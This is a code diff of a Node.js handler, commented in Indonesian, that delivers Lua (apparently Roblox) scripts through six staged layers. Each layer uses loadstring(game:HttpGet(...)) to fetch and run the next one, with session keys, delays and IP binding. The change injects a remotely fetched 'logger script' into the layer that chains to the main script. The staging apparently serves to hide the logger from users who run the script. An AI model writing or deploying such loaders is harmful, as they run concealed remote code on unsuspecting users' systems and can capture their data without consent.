@@ -169,9 +169,9 @@ module.exports = async function(req, res) {
          * idx 0 → layer 1 → redirect biasa
          * idx 1 → layer 2 → redirect biasa
          * idx 2 → layer 3 → redirect biasa
-         * idx 3 → layer 4 → logger script + loadstring ke layer 5
-         * idx 4 → layer 5 → isi logger script SAJA (tanpa loadstring)
-         * idx 5 → layer 6 → isi main script SAJA
+         * idx 3 → layer 4 → redirect biasa
+         * idx 4 → layer 5 → logger script + loadstring ke layer 6
+         * idx 5 → layer 6 → main script SAJA ✅
          */
 
         // ========== LAYER 6 (idx = TOTAL_LAYERS - 1): MAIN SCRIPT SAJA ==========
@@ -181,28 +181,22 @@ module.exports = async function(req, res) {
             return res.status(200).send(mainScript || '');
         }
 
-        // ========== LAYER 5 (idx = TOTAL_LAYERS - 2): LOGGER SCRIPT SAJA ==========
+        // ========== LAYER 5 (idx = TOTAL_LAYERS - 2): LOGGER SCRIPT + REDIRECT KE LAYER 6 ==========
         if (idx === SETTINGS.TOTAL_LAYERS - 2) {
-            const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
-            delete sessions[id];
-            return res.status(200).send(loggerScript || '');
-        }
-
-        // ========== LAYER 4 (idx = TOTAL_LAYERS - 3): REDIRECT KE LAYER 5 ==========
-        if (idx === SETTINGS.TOTAL_LAYERS - 3) {
             const nextIndex = idx + 1;
             const { newSessionID, nextKey, waitTime } = makeSession(
                 session.ownerIP, session.stepSequence, nextIndex, session.startTime
             );
             delete sessions[id];
 
+            const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
             const nextStepNumber = session.stepSequence[nextIndex];
             const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
-            const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
+            const luaScript = (loggerScript || '') + "\ntask.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
             return res.status(200).send(luaScript);
         }
 
-        // ========== LAYER 1-3 (idx 0,1,2): REDIRECT BIASA ==========
+        // ========== LAYER 1-4 (idx 0,1,2,3): REDIRECT BIASA ==========
         const nextIndex = idx + 1;
         const { newSessionID, nextKey, waitTime } = makeSession(
             session.ownerIP, session.stepSequence, nextIndex, session.startTime
